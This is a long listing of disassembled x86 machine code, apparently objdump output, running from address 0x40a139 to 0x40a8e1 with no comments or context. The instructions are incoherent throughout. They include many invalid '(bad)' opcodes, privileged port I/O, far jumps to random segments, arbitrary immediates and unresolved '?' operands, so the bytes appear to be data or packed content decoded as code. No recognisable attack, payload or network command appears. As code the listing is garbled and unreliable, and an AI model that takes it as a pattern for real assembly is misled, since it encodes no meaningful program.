  40a139:	aad    0x84
  40a13b:	push   esi
  40a13c:	xchg   bh,bh
  40a13e:	fstp   DWORD PTR [edx]
  40a140:	mov    al,BYTE PTR [edi+0x620043fc]
  40a146:	or     esp,DWORD PTR [ecx]
  40a148:	jno    0x40a0f5
  40a14a:	neg    cl
  40a14c:	pop    ebx
  40a14d:	xlat   BYTE PTR ds:[ebx]
  40a14e:	fisub  WORD PTR [edx-0x37153fc9]
  40a154:	sbb    eax,0xe5af8bcc
  40a159:	inc    ebp
  40a15a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a15b:	jo     0x40a12c
  40a15d:	jae    0x40a1c7
  40a15f:	or     esi,DWORD PTR [ebp+eiz*2-0x4af674ce]
  40a166:	inc    eax
  40a167:	inc    ebp
  40a168:	xchg   esp,eax
  40a169:	addr16 jl 0x40a12e
  40a16c:	push   ecx
  40a16d:	inc    eax
  40a16e:	sub    BYTE PTR [eax-0x54770b5a],0xd4
  40a175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a176:	mov    ?,edi
  40a178:	push   esp
  40a179:	sbb    DWORD PTR [esi+0x20],0x223be78
  40a180:	sahf   
  40a181:	pop    ecx
  40a182:	jne    0x40a129
  40a184:	mov    bh,ah
  40a186:	xor    al,0x0
  40a188:	sbb    bh,ah
  40a18a:	clc    
  40a18b:	repnz aam 0x27
  40a18e:	lahf   
  40a18f:	sub    DWORD PTR [ebx-0x20],ebp
  40a192:	mov    ch,0xfc
  40a194:	out    0x4d,al
  40a196:	mov    bh,0xf0
  40a198:	imul   BYTE PTR ds:0x2397190
  40a19e:	lahf   
  40a19f:	lds    edx,FWORD PTR [ecx-0x149180da]
  40a1a5:	test   DWORD PTR [ecx-0x1ebc51f1],ecx
  40a1ab:	xor    DWORD PTR [esp+eax*4-0x5e],edx
  40a1af:	dec    edi
  40a1b0:	shl    BYTE PTR [eax-0x4],cl
  40a1b3:	mov    ecx,0xad668da2
  40a1b8:	out    dx,eax
  40a1b9:	or     ch,ch
  40a1bb:	lock jl 0x40a13e
  40a1be:	cli    
  40a1bf:	clc    
  40a1c0:	inc    edi
  40a1c1:	sub    eax,0x567201c5
  40a1c6:	enter  0x3fee,0x34
  40a1ca:	aad    0x4e
  40a1cc:	pop    esi
  40a1cd:	push   ebx
  40a1ce:	push   eax
  40a1cf:	mul    BYTE PTR [ebx]
  40a1d1:	js     0x40a165
  40a1d3:	sub    DWORD PTR [ecx+0x4d],edi
  40a1d6:	aad    0x52
  40a1d8:	jne    0x40a200
  40a1da:	je     0x40a1d2
  40a1dc:	loope  0x40a24d
  40a1de:	mov    al,ds:0xa3a35f74
  40a1e3:	fld    QWORD PTR [eax-0x3]
  40a1e6:	cld    
  40a1e7:	shl    DWORD PTR [edx+0x4feb33cd],0xa7
  40a1ee:	pop    eax
  40a1ef:	icebp  
  40a1f0:	mov    ds:0x1916a2ee,eax
  40a1f5:	dec    ebx
  40a1f6:	and    BYTE PTR [eax],dl
  40a1f8:	cmc    
  40a1f9:	scas   eax,DWORD PTR es:[edi]
  40a1fa:	mov    WORD PTR [ebx+edi*8+0x3a],es
  40a1fe:	jl     0x40a1d6
  40a200:	dec    edi
  40a201:	dec    ebp
  40a202:	sub    eax,0x219e0c7c
  40a207:	and    eax,0xf1f8bebb
  40a20c:	fdivr  QWORD PTR [ecx]
  40a20e:	pop    ebp
  40a20f:	xchg   ebx,eax
  40a210:	push   ss
  40a211:	xchg   edx,eax
  40a212:	(bad)  
  40a213:	pop    edx
  40a214:	mov    edx,0xfcf2e9ca
  40a219:	loopne 0x40a298
  40a21b:	sub    eax,0x70dfc650
  40a220:	pop    esp
  40a221:	punpckldq mm7,DWORD PTR [esi]
  40a224:	rcr    BYTE PTR [esi],cl
  40a226:	neg    esp
  40a228:	loope  0x40a1d8
  40a22a:	push   ss
  40a22b:	fimul  WORD PTR [edx+0x5f81f118]
  40a231:	pop    ecx
  40a232:	cmp    al,0xe7
  40a234:	inc    ebx
  40a235:	dec    edx
  40a236:	cmp    DWORD PTR [ebx-0x61a97067],0xc383dfbd
  40a240:	pop    es
  40a241:	push   eax
  40a242:	cmp    BYTE PTR [ecx+0x7b58444c],ch
  40a248:	and    DWORD PTR [edi+0x6171f535],edi
  40a24e:	push   esi
  40a24f:	push   cs
  40a250:	daa    
  40a251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a252:	in     al,0x6a
  40a254:	push   0xd0823f6d
  40a259:	js     0x40a1fd
  40a25b:	push   esi
  40a25c:	mov    DWORD PTR [eax],esp
  40a25e:	mov    ds:0x7055267a,al
  40a263:	push   0x10b5bd9
  40a268:	jge    0x40a240
  40a26a:	jb     0x40a291
  40a26c:	int3   
  40a26d:	scas   al,BYTE PTR es:[edi]
  40a26e:	xchg   esi,eax
  40a26f:	push   cs
  40a270:	inc    ebp
  40a271:	stos   DWORD PTR es:[edi],eax
  40a272:	dec    ecx
  40a273:	sub    BYTE PTR [ebp-0x20a76f5c],al
  40a279:	(bad)  
  40a27a:	repz xor eax,0xde14b14f
  40a280:	xor    eax,DWORD PTR [ecx-0x4e]
  40a283:	(bad)  
  40a284:	rcr    DWORD PTR [esi],1
  40a286:	mov    ebp,0x93a2df13
  40a28b:	test   al,0x93
  40a28d:	std    
  40a28e:	aaa    
  40a28f:	in     eax,dx
  40a290:	in     al,dx
  40a291:	or     DWORD PTR [edx],esp
  40a293:	dec    edx
  40a294:	dec    ebx
  40a295:	fsub   QWORD PTR [ebp-0x52]
  40a298:	sub    BYTE PTR ds:0xc29fc5e8,dh
  40a29e:	and    al,0x16
  40a2a0:	xor    bl,BYTE PTR [edi-0x4f2b36c0]
  40a2a6:	ror    DWORD PTR [eax],1
  40a2a8:	fimul  WORD PTR [eax+0x75]
  40a2ab:	fiadd  DWORD PTR [eax+ecx*4-0x4]
  40a2af:	fimul  WORD PTR [esi]
  40a2b1:	xchg   DWORD PTR [eax-0x72],ebx
  40a2b4:	cmp    al,BYTE PTR ds:0x28aa965
  40a2ba:	push   edx
  40a2bb:	ret    0xcb17
  40a2be:	or     BYTE PTR [ebx],ch
  40a2c0:	mov    ds,esi
  40a2c2:	popf   
  40a2c3:	mov    dl,0x33
  40a2c5:	sub    ah,cl
  40a2c7:	jb     0x40a2ce
  40a2c9:	mov    eax,0x63e6603a
  40a2ce:	sbb    BYTE PTR [edx],0x5c
  40a2d1:	je     0x40a2af
  40a2d3:	fnstenv [ebp+edi*1+0x6b]
  40a2d7:	pop    es
  40a2d8:	fwait
  40a2d9:	xor    eax,0x56efcb95
  40a2de:	push   cs
  40a2df:	xlat   BYTE PTR ds:[ebx]
  40a2e0:	mov    ds:0x95834e6,eax
  40a2e5:	rol    DWORD PTR [edi],cl
  40a2e7:	sbb    al,0xad
  40a2e9:	inc    ebp
  40a2ea:	xchg   ecx,eax
  40a2eb:	enter  0x3a04,0xff
  40a2ef:	sub    al,BYTE PTR [edi+ecx*4]
  40a2f2:	ficomp WORD PTR [edi+edi*2]
  40a2f5:	push   ebp
  40a2f6:	adc    DWORD PTR [ebx+0x3802854f],edx
  40a2fc:	jge    0x40a36f
  40a2fe:	xor    dh,cl
  40a300:	stos   DWORD PTR es:[edi],eax
  40a301:	push   cs
  40a302:	sub    esp,DWORD PTR [edi]
  40a304:	mov    WORD PTR [edx-0x52ad81bc],gs
  40a30a:	mov    eax,0xc95a9a17
  40a30f:	push   0xe11e1617
  40a314:	dec    esi
  40a315:	ficomp WORD PTR [edi-0x2eea20f7]
  40a31b:	add    eax,0x92b735bc
  40a320:	rol    DWORD PTR [esi+0x1d],cl
  40a323:	sbb    al,0x88
  40a325:	cld    
  40a326:	add    al,BYTE PTR [ebx-0x1d578a5a]
  40a32c:	int3   
  40a32d:	fcom   DWORD PTR [ecx+0x2fa76aee]
  40a333:	mov    esi,0xaea0a922
  40a338:	into   
  40a339:	fs mov esi,0xefbadf35
  40a33f:	test   eax,0x15033d74
  40a344:	ret    
  40a345:	mov    al,ds:0x1a1d544f
  40a34a:	xor    ebp,ebp
  40a34c:	push   esi
  40a34d:	or     eax,0x81253dde
  40a352:	es call 0xab19:0x16b15316
  40a35a:	mov    bh,0x7f
  40a35c:	inc    ebp
  40a35d:	add    eax,0x16c3ef8a
  40a362:	bound  edi,QWORD PTR [edx-0x47]
  40a365:	jns    0x40a39d
  40a367:	cwde   
  40a368:	test   al,0x41
  40a36a:	leave  
  40a36b:	or     eax,0xa12641f6
  40a370:	xchg   ebx,eax
  40a371:	cmc    
  40a372:	imul   ebp
  40a374:	ror    DWORD PTR [eax-0x2d],cl
  40a377:	dec    edx
  40a378:	dec    esi
  40a379:	fcomp  DWORD PTR [ebx+0x7b86e82c]
  40a37f:	or     al,0x56
  40a381:	aas    
  40a382:	sbb    DWORD PTR [ebx+0xb59562b],0x980a78a
  40a38c:	mov    edx,0x9151522
  40a391:	lahf   
  40a392:	inc    ecx
  40a393:	pushf  
  40a394:	fldenv [ebp-0x28312eed]
  40a39a:	aaa    
  40a39b:	xchg   BYTE PTR [ebx+0x4469f533],bh
  40a3a1:	fidiv  WORD PTR [ebx]
  40a3a3:	std    
  40a3a4:	add    al,0x34
  40a3a6:	and    dl,bh
  40a3a8:	pop    eax
  40a3a9:	pop    es
  40a3aa:	add    eax,0xba5686b3
  40a3af:	cwde   
  40a3b0:	mov    DWORD PTR [esi+0x1a],eax
  40a3b3:	test   DWORD PTR [ecx],0x2d65ae3a
  40a3b9:	ins    DWORD PTR es:[edi],dx
  40a3ba:	push   edi
  40a3bb:	xlat   BYTE PTR ds:[ebx]
  40a3bc:	sbb    eax,0x97c8ad13
  40a3c1:	pop    ebp
  40a3c2:	pop    esp
  40a3c3:	(bad)
  40a3c6:	pop    es
  40a3c7:	idiv   BYTE PTR [edx-0x23]
  40a3ca:	mov    BYTE PTR [ebx-0x44],bl
  40a3cd:	call   0xb4afa851
  40a3d2:	xchg   ebp,eax
  40a3d3:	add    DWORD PTR [edi],ebp
  40a3d5:	loopne 0x40a3c3
  40a3d7:	sbb    esp,DWORD PTR [ebp+esi*8+0x47891422]
  40a3de:	lods   eax,DWORD PTR ds:[esi]
  40a3df:	aaa    
  40a3e0:	push   esi
  40a3e1:	mov    ds:0x40e86e21,eax
  40a3e6:	xchg   edi,eax
  40a3e7:	les    edi,FWORD PTR [ebp+0x1d]
  40a3ea:	pop    ss
  40a3eb:	push   ds
  40a3ec:	rcr    DWORD PTR [eax+esi*4+0xea63c93],1
  40a3f3:	inc    eax
  40a3f4:	nop
  40a3f5:	xchg   edi,eax
  40a3f6:	xchg   esi,edi
  40a3f8:	imul   edi,edx,0x28
  40a3fb:	and    edx,edi
  40a3fd:	add    eax,0x6b4f5d8f
  40a402:	jbe    0x40a3b8
  40a404:	jmp    0xdc8da190
  40a409:	jmp    0xf1e6f749
  40a40e:	pop    ebp
  40a40f:	add    al,al
  40a411:	lds    ebp,FWORD PTR [eax+0x61a0aa3f]
  40a417:	out    0x9e,al
  40a419:	pushf  
  40a41a:	push   ds
  40a41b:	imul   edi,DWORD PTR [esi],0xffffffb5
  40a41e:	mov    dl,0x88
  40a420:	inc    edi
  40a421:	push   ecx
  40a422:	cmp    ebx,ecx
  40a424:	imul   esp,edi,0x6b52001b
  40a42a:	or     DWORD PTR [ebx+ecx*4-0x63],eax
  40a42e:	mov    bh,0x98
  40a430:	or     BYTE PTR [eax+0x27],dl
  40a433:	jmp    0xa28e:0xc11da4ba
  40a43a:	cmp    eax,0x84089a2f
  40a43f:	jbe    0x40a3eb
  40a441:	xchg   esi,eax
  40a442:	push   ss
  40a443:	in     eax,dx
  40a444:	icebp  
  40a445:	pop    edx
  40a446:	pop    ds
  40a447:	ins    BYTE PTR es:[edi],dx
  40a448:	jnp    0x40a3cc
  40a44a:	mov    ch,0xe0
  40a44c:	fmul   QWORD PTR [ecx+edx*4]
  40a44f:	paddsw mm4,QWORD PTR [edi+0x22]
  40a453:	pop    ebx
  40a454:	mov    cl,0x4d
  40a456:	fsub   DWORD PTR [ebx+0x66a99f63]
  40a45c:	lea    ecx,[ecx+0x3a]
  40a45f:	sbb    dh,al
  40a461:	lods   al,BYTE PTR fs:[esi]
  40a463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a464:	popf   
  40a465:	bnd jne 0x40a420
  40a468:	js     0x40a43e
  40a46a:	(bad)  
  40a46b:	mov    ah,0xb6
  40a46d:	mov    WORD PTR [esi],?
  40a46f:	jbe    0x40a417
  40a471:	push   ecx
  40a472:	pop    edi
  40a473:	jae    0x40a463
  40a475:	cwde   
  40a476:	pop    ds
  40a477:	out    0x3a,al
  40a479:	xchg   ecx,eax
  40a47a:	out    dx,eax
  40a47b:	arpl   WORD PTR [ebx],dx
  40a47d:	add    eax,0x1a6da2d1
  40a482:	lods   eax,DWORD PTR ds:[esi]
  40a483:	js     0x40a493
  40a485:	and    DWORD PTR [eax],0xfffffff8
  40a488:	sti    
  40a489:	or     ecx,esi
  40a48b:	mov    ecx,0xc96827a1
  40a490:	je     0x40a41e
  40a492:	sbb    al,0x46
  40a494:	push   0xffffff83
  40a496:	or     al,0x5a
  40a499:	xor    edx,DWORD PTR [esp+edx*2-0x1e8bb3f3]
  40a4a0:	f2xm1  
  40a4a2:	inc    edx
  40a4a3:	mov    bh,0xd7
  40a4a5:	shl    edi,cl
  40a4a7:	jle    0x40a4aa
  40a4a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4aa:	mov    esi,ecx
  40a4ac:	pop    ds
  40a4ad:	inc    ebx
  40a4ae:	pop    esi
  40a4af:	aaa    
  40a4b0:	mov    es,WORD PTR [ecx-0x57eb4702]
  40a4b6:	xchg   esp,eax
  40a4b7:	or     dl,ah
  40a4b9:	leave  
  40a4ba:	sub    eax,0x5e37d8fa
  40a4bf:	stos   BYTE PTR es:[edi],al
  40a4c0:	ror    DWORD PTR [esp+esi*1],0xef
  40a4c4:	sub    eax,0x2f03238b
  40a4c9:	retf   
  40a4ca:	jno    0x40a4bd
  40a4cc:	push   cs
  40a4cd:	cmp    esp,DWORD PTR [edx*1-0x3a91ba21]
  40a4d4:	mov    dh,0x2b
  40a4d6:	cmp    al,0xfa
  40a4d8:	push   ss
  40a4d9:	retf   0x1518
  40a4dc:	jg     0x40a4b5
  40a4de:	xchg   ebx,eax
  40a4df:	mov    edi,0xca5924fc
  40a4e4:	sub    bh,BYTE PTR [ebp+ecx*1-0xb]
  40a4e8:	jmp    FWORD PTR [edi+0x75eae4f8]
  40a4ee:	ror    ah,0x98
  40a4f1:	mov    ah,0xaf
  40a4f3:	jg     0x40a542
  40a4f5:	mov    esi,0x617eb782
  40a4fa:	pop    ecx
  40a4fb:	pop    es
  40a4fc:	ficom  DWORD PTR [edx]
  40a4fe:	fstp   QWORD PTR cs:[ecx-0x3e9deb5a]
  40a505:	cmp    DWORD PTR [ecx-0x17d9b44a],esi
  40a50b:	mov    ecx,0x3e787abc
  40a510:	push   ss
  40a511:	fucomi st,st(2)
  40a513:	outs   dx,BYTE PTR ds:[esi]
  40a514:	or     esi,DWORD PTR [ebx+0x7d]
  40a517:	dec    eax
  40a518:	dec    ecx
  40a519:	imul   esp,DWORD PTR [eax-0x4b45f74b],0xffffff9c
  40a520:	mov    cs,WORD PTR [edx-0x20a98d43]
  40a526:	repz aam 0x89
  40a529:	iret   
  40a52a:	jnp    0x40a4d7
  40a52c:	mov    esi,0xba05e373
  40a531:	pop    esp
  40a532:	jmp    0x40a58e
  40a534:	lds    edx,FWORD PTR [edi]
  40a536:	jo     0x40a521
  40a538:	pop    es
  40a539:	es push ecx
  40a53b:	gs cmp ch,dl
  40a53e:	dec    ebx
  40a53f:	sub    esp,esi
  40a541:	and    eax,0xe2ed4962
  40a546:	jmp    0x7b62:0xd1515a0a
  40a54d:	(bad)  
  40a54e:	xor    eax,0xbb99f26d
  40a553:	push   ebx
  40a554:	shl    DWORD PTR [edx],1
  40a556:	mov    bl,0x7b
  40a558:	neg    BYTE PTR [ebp+0x5d]
  40a55b:	add    dh,BYTE PTR [ecx-0x40f2a8fe]
  40a561:	xchg   ecx,eax
  40a562:	mov    bl,0x4b
  40a564:	push   ebp
  40a565:	imul   ecx,DWORD PTR [esi+0x6af57581],0xffffffe0
  40a56c:	inc    edx
  40a56d:	shl    ch,0x17
  40a570:	pop    ecx
  40a571:	adc    eax,0xd8c5533a
  40a576:	out    dx,eax
  40a577:	rcr    DWORD PTR [eax+0x70],0xb0
  40a57b:	pop    ecx
  40a57c:	popa   
  40a57d:	jge    0x40a5b6
  40a57f:	add    bh,cl
  40a581:	scas   al,BYTE PTR es:[edi]
  40a582:	push   ss
  40a583:	pop    ss
  40a584:	ja     0x40a594
  40a586:	adc    DWORD PTR [edx+edx*1+0x230162dd],eax
  40a58d:	mov    eax,0xa6f82e98
  40a592:	aam    0x98
  40a594:	or     DWORD PTR [esi+0x6b2869a0],0x6d
  40a59b:	clc    
  40a59c:	rcr    DWORD PTR [esp+edi*2-0x18],cl
  40a5a0:	pand   mm4,QWORD PTR [edx+ebp*4+0x6eda646c]
  40a5a8:	mov    al,ds:0xea62855b
  40a5ad:	xor    esi,eax
  40a5af:	es out 0x57,al
  40a5b2:	mov    al,ds:0xa740dc71
  40a5b7:	pop    edi
  40a5b8:	lods   eax,DWORD PTR ds:[esi]
  40a5b9:	push   ds
  40a5ba:	jge    0x40a575
  40a5bc:	iret   
  40a5bd:	popf   
  40a5be:	outs   dx,DWORD PTR ds:[esi]
  40a5bf:	inc    ecx
  40a5c0:	cmp    BYTE PTR [esi-0x192266e2],ch
  40a5c6:	dec    edi
  40a5c7:	jge    0x40a639
  40a5c9:	repz cld 
  40a5cb:	(bad)  
  40a5cc:	mov    esp,0x645a97b9
  40a5d1:	into   
  40a5d2:	pop    esp
  40a5d3:	and    edi,edi
  40a5d5:	out    dx,eax
  40a5d6:	inc    ecx
  40a5d7:	sub    al,0x79
  40a5d9:	lea    esi,[esi]
  40a5db:	dec    ebp
  40a5dc:	and    al,0xdc
  40a5de:	fnstcw WORD PTR [ebp+0x75]
  40a5e1:	pop    esi
  40a5e2:	add    ch,dh
  40a5e4:	pop    bx
  40a5e6:	jmp    0xede8e750
  40a5eb:	inc    esi
  40a5ec:	xchg   ebx,eax
  40a5ed:	dec    ecx
  40a5ee:	and    dh,BYTE PTR [ebp-0x3f81dd8a]
  40a5f4:	call   0x2f90:0xbeee1457
  40a5fb:	repnz pop esp
  40a5fd:	mov    esp,DWORD PTR [ebx-0x46]
  40a600:	(bad)  
  40a601:	call   0x7ef4f6f9
  40a606:	(bad)  [edx+0x5737803f]
  40a60c:	add    BYTE PTR [ebx-0x647ef676],0x68
  40a613:	jg     0x40a64c
  40a615:	mov    ebp,0xf1558102
  40a61a:	test   DWORD PTR [ebx-0x4f],edx
  40a61d:	sahf   
  40a61e:	push   ebp
  40a61f:	push   eax
  40a620:	cmp    eax,0xd5dccc60
  40a625:	adc    eax,0x222f74f
  40a62a:	jg     0x40a668
  40a62c:	daa    
  40a62d:	inc    esp
  40a62e:	xor    eax,0xba5a2e1d
  40a633:	loope  0x40a67e
  40a635:	xor    al,0x25
  40a637:	jnp    0x40a636
  40a639:	in     eax,dx
  40a63a:	(bad)  
  40a63b:	pop    ds
  40a63c:	or     DWORD PTR [ebp+0x7cf90e4],eax
  40a642:	pop    eax
  40a643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a644:	pop    edx
  40a645:	fwait
  40a646:	in     eax,0x2d
  40a648:	and    DWORD PTR [eax+0x13],edi
  40a64b:	xor    al,0x61
  40a64d:	mov    al,ds:0x9a212044
  40a652:	lea    ebp,[eax-0x42686864]
  40a658:	inc    edx
  40a659:	(bad)  
  40a65a:	in     al,0x6d
  40a65c:	in     al,dx
  40a65d:	arpl   WORD PTR [edi],bx
  40a65f:	lds    ecx,FWORD PTR [edx]
  40a661:	push   edx
  40a662:	and    al,0xb7
  40a664:	test   DWORD PTR [eax-0x36],0x8acadf34
  40a66b:	push   es
  40a66c:	dec    ebx
  40a66d:	sbb    DWORD PTR [edx+0xc78cc38],esp
  40a673:	gs pop ss
  40a675:	pop    ecx
  40a676:	inc    ebx
  40a677:	pop    edx
  40a678:	pop    esi
  40a679:	sub    al,0x50
  40a67b:	out    0xd6,eax
  40a67d:	mov    eax,0xa9511b8f
  40a682:	imul   ebp,esp,0x89eea4f9
  40a688:	mov    BYTE PTR [esp+esi*4-0x80],0xe5
  40a68d:	pop    ebp
  40a68e:	xchg   ebx,eax
  40a68f:	cs dec edx
  40a691:	and    DWORD PTR [ebx-0x3477d0fe],edx
  40a697:	nop
  40a698:	inc    ebp
  40a699:	cwde   
  40a69a:	mov    ah,0xd6
  40a69c:	dec    edx
  40a69d:	pop    edx
  40a69e:	pop    esp
  40a69f:	int    0x87
  40a6a1:	icebp  
  40a6a2:	or     BYTE PTR [edi+eiz*4-0x7e01b872],bl
  40a6a9:	add    al,0xde
  40a6ab:	pop    esp
  40a6ac:	rol    BYTE PTR [ebp+0x7575dfe4],1
  40a6b2:	push   ecx
  40a6b3:	add    BYTE PTR [ecx],dl
  40a6b5:	adc    al,0x85
  40a6b7:	rcr    DWORD PTR [edx+0x5a07f4c6],cl
  40a6bd:	xlat   BYTE PTR ds:[ebx]
  40a6be:	xor    dh,cl
  40a6c0:	xor    al,0xdf
  40a6c2:	lahf   
  40a6c3:	jl     0x40a676
  40a6c5:	jecxz  0x40a6cd
  40a6c7:	rcl    BYTE PTR [esi],cl
  40a6c9:	xor    eax,0xf190ca
  40a6ce:	mov    bh,0x5e
  40a6d0:	cmp    edi,DWORD PTR [ebx+0x11]
  40a6d3:	ret    
  40a6d4:	arpl   WORD PTR [ecx+0x4b3e17ca],sp
  40a6da:	adc    WORD PTR [ecx+ecx*1-0x76],di
  40a6df:	inc    esp
  40a6e0:	mov    dh,0x72
  40a6e2:	push   ds
  40a6e3:	mov    esp,0x751d0088
  40a6e8:	cmp    dh,BYTE PTR [ebp-0x5f]
  40a6eb:	xchg   esi,eax
  40a6ec:	xchg   edi,eax
  40a6ed:	jo     0x40a6ee
  40a6ef:	sub    esi,DWORD PTR [esi]
  40a6f1:	mov    ds:0xb1e1447a,al
  40a6f6:	lods   eax,DWORD PTR ds:[esi]
  40a6f7:	ja     0x40a73e
  40a6f9:	and    BYTE PTR [ecx-0x7b],dh
  40a6fc:	stos   BYTE PTR es:[edi],al
  40a6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6fe:	je     0x40a736
  40a700:	in     eax,0x1f
  40a702:	mov    edx,ebp
  40a704:	and    eax,0xb61cc1dd
  40a709:	dec    edx
  40a70a:	sub    eax,0xbb7c7af3
  40a70f:	adc    DWORD PTR [ebp+edi*1-0x39f9be5a],ecx
  40a716:	daa    
  40a717:	sbb    al,0x25
  40a719:	cmp    edi,esp
  40a71b:	push   es
  40a71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a71d:	outs   dx,BYTE PTR ds:[esi]
  40a71e:	sub    esp,DWORD PTR [esi]
  40a720:	dec    ebp
  40a721:	adc    BYTE PTR [edx],cl
  40a723:	pop    ecx
  40a724:	les    ebx,FWORD PTR [esp+ebp*1]
  40a727:	adc    BYTE PTR [esi-0x3e],ch
  40a72a:	mov    ecx,0x7fe334fc
  40a72f:	test   DWORD PTR [ebx],esp
  40a731:	adc    eax,0x42ee9bd8
  40a736:	mov    ds:0x32e3f94c,al
  40a73b:	aaa    
  40a73c:	jns    0x40a792
  40a73e:	call   0x149:0x2cc2c4b2
  40a745:	(bad)
  40a748:	call   0x2b7f:0xe50f9a74
  40a74f:	arpl   WORD PTR [edx],sp
  40a751:	cli    
  40a752:	leave  
  40a753:	cld    
  40a754:	sbb    bl,dh
  40a756:	mov    ds:0xe77a39fb,al
  40a75b:	dec    ecx
  40a75c:	inc    edx
  40a75d:	or     al,0x3b
  40a75f:	nop
  40a760:	test   DWORD PTR [esi],eax
  40a762:	outs   dx,BYTE PTR ds:[esi]
  40a763:	jae    0x40a7d0
  40a765:	or     eax,DWORD PTR [ebp+esi*2-0x52]
  40a769:	sub    edi,DWORD PTR [eax]
  40a76b:	cmp    esp,DWORD PTR [ebx+0x4feb6018]
  40a771:	push   0xffffffb4
  40a773:	jno    0x40a7c9
  40a775:	arpl   WORD PTR [esi+edi*2+0x1cc65d83],di
  40a77c:	xchg   ebx,eax
  40a77d:	stos   BYTE PTR es:[edi],al
  40a77e:	push   0xffffffec
  40a780:	sbb    al,0xdd
  40a782:	adc    DWORD PTR [ebx-0x36944e81],ebx
  40a788:	arpl   WORD PTR [esi-0x16],ax
  40a78b:	int3   
  40a78c:	imul   esp,DWORD PTR [edi],0x6e4a73a7
  40a792:	pop    ss
  40a793:	sbb    al,0xfd
  40a795:	sti    
  40a796:	adc    al,0x80
  40a798:	push   eax
  40a799:	imul   esi,DWORD PTR [edx-0x29ec073d],0x9f86041c
  40a7a3:	aas    
  40a7a4:	jge    0x40a7c8
  40a7a6:	jo     0x40a77b
  40a7a8:	ins    BYTE PTR es:[edi],dx
  40a7a9:	mov    ds:0xccf99fd0,al
  40a7ae:	mov    ?,WORD PTR [ebp+0x22a5dd91]
  40a7b4:	shl    al,1
  40a7b6:	test   dl,dl
  40a7b8:	es cwde 
  40a7ba:	cmp    DWORD PTR [eax-0x1e137131],0x5b
  40a7c1:	xchg   BYTE PTR [ebx+edx*2-0x720da277],cl
  40a7c8:	into   
  40a7c9:	cli    
  40a7ca:	aad    0xe1
  40a7cc:	add    DWORD PTR [ebp+0x1e],esi
  40a7cf:	mov    edx,0x6adbfa1d
  40a7d4:	push   ecx
  40a7d5:	add    eax,0x9128eab9
  40a7da:	pushf  
  40a7db:	jecxz  0x40a79b
  40a7dd:	ret    0x5136
  40a7e0:	gs xor eax,0xd4a84f4a
  40a7e6:	mov    BYTE PTR [esi+0x72e610c2],ch
  40a7ec:	dec    DWORD PTR [edx*4+0x6acf3d32]
  40a7f3:	lods   eax,DWORD PTR ds:[esi]
  40a7f4:	sub    eax,0xcad9aaa5
  40a7f9:	dec    edx
  40a7fa:	nop
  40a7fb:	retf   0xdd00
  40a7fe:	add    bh,cl
  40a800:	inc    eax
  40a801:	push   esi
  40a802:	and    BYTE PTR [eax],dh
  40a804:	mov    ah,0x2
  40a806:	lods   al,BYTE PTR ds:[esi]
  40a807:	sub    DWORD PTR [ecx+0x60],edx
  40a80a:	adc    eax,0x9361ab51
  40a80f:	es daa 
  40a811:	das    
  40a812:	mov    dl,0x9f
  40a814:	sbb    eax,0xb6e4772f
  40a819:	(bad)  
  40a81a:	lock mov al,0x97
  40a81d:	sbb    eax,DWORD PTR [ecx+0x17513e1c]
  40a823:	shl    BYTE PTR [edi+0x20],1
  40a826:	popa   
  40a827:	inc    ebx
  40a828:	cmp    eax,0x1d19a1e0
  40a82d:	add    al,0xb
  40a82f:	push   eax
  40a830:	clc    
  40a831:	pop    ds
  40a832:	pop    ds
  40a833:	mov    ?,WORD PTR [eax+0x64]
  40a836:	or     DWORD PTR [ecx],ebx
  40a838:	jp     0x40a83e
  40a83a:	in     al,dx
  40a83b:	out    0xf5,eax
  40a83d:	pop    esp
  40a83e:	dec    eax
  40a83f:	(bad)  
  40a840:	sti    
  40a841:	(bad)  
  40a842:	jbe    0x40a838
  40a844:	js     0x40a830
  40a846:	inc    edi
  40a847:	ficomp DWORD PTR [ebp-0x35]
  40a84a:	nop
  40a84b:	mov    ebx,0x6e30b48a
  40a850:	mov    esi,0x215a5d0b
  40a855:	mov    edx,DWORD PTR [eax]
  40a857:	sub    eax,0xa49054b3
  40a85c:	cld    
  40a85d:	inc    DWORD PTR [edx]
  40a85f:	xor    DWORD PTR [ecx-0x2e],edx
  40a862:	pop    edx
  40a863:	retf   
  40a864:	lds    edi,FWORD PTR [eax]
  40a866:	lods   eax,DWORD PTR ds:[esi]
  40a867:	push   ds
  40a868:	cmp    edi,ebx
  40a86a:	and    eax,0xc3fe1ff2
  40a86f:	test   DWORD PTR [esi+0x27788762],edi
  40a875:	test   al,0x33
  40a877:	(bad)
  40a87c:	mov    WORD PTR ds:0xf0a19e1c,ds
  40a882:	jae    0x40a884
  40a884:	data16 gs aaa 
  40a887:	add    ebp,DWORD PTR [eax+0x18]
  40a88a:	loop   0x40a8e4
  40a88c:	into   
  40a88d:	into   
  40a88e:	rep stos BYTE PTR es:[edi],al
  40a890:	out    dx,eax
  40a891:	jae    0x40a8e5
  40a893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a894:	cmp    ch,BYTE PTR [eax-0x2]
  40a897:	in     eax,0x6e
  40a899:	push   ecx
  40a89a:	mov    esp,0x9adc011
  40a89f:	push   cs
  40a8a0:	or     eax,0x522571de
  40a8a5:	scas   eax,DWORD PTR es:[edi]
  40a8a6:	rol    DWORD PTR [ecx+0x21],cl
  40a8a9:	pop    esp
  40a8aa:	pop    es
  40a8ab:	lahf   
  40a8ac:	clc    
  40a8ad:	inc    ebp
  40a8ae:	cli    
  40a8af:	out    dx,al
  40a8b0:	pop    eax
  40a8b1:	lock xchg BYTE PTR [ecx+eax*8-0xed3d7e6],dl
  40a8b9:	mov    ds:0x10b93920,eax
  40a8be:	pop    ebp
  40a8bf:	dec    esi
  40a8c0:	pop    edi
  40a8c1:	cdq    
  40a8c2:	adc    al,0x28
  40a8c4:	in     eax,dx
  40a8c5:	lea    edx,ds:0x9a6aff09
  40a8cb:	enter  0x3ce,0x88
  40a8cf:	jae    0x40a8de
  40a8d1:	or     BYTE PTR [ecx+0x2f310799],0x6c
  40a8d8:	xor    al,ah
  40a8da:	add    ah,BYTE PTR [eax-0x6e57c0b3]
  40a8e0:	lahf   
  40a8e1:	popf   
